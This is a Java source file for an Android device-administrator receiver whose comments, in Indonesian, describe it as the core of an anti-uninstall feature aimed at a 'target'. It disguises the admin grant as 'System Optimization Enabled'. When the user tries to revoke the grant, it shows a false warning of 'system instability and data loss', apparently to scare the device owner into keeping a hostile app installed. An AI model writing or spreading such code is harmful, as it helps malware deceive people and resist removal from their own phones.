package com.nullx.pp;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import androidx.annotation.NonNull;

/**
 * AdminReceiver: Komponen Inti untuk Fitur Anti-Uninstall.
 * Menghubungkan aplikasi dengan DevicePolicyManager Android.
 */
public class AdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
        // Eksekusi saat target menekan tombol "Activate"
        Toast.makeText(context, "System Optimization Enabled", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onDisabled(@NonNull Context context, @NonNull Intent intent) {
        super.onDisabled(context, intent);
        // Logika tambahan jika target berhasil mematikan admin (jarang terjadi jika terkunci)
        Toast.makeText(context, "Critical: System Security Disabled", Toast.LENGTH_LONG).show();
    }

    @Override
    public CharSequence onDisableRequested(@NonNull Context context, @NonNull Intent intent) {
        // Pesan yang muncul saat target mencoba menonaktifkan Admin di pengaturan
        return "Warning: Disabling this will cause system instability and data loss.";
    }
}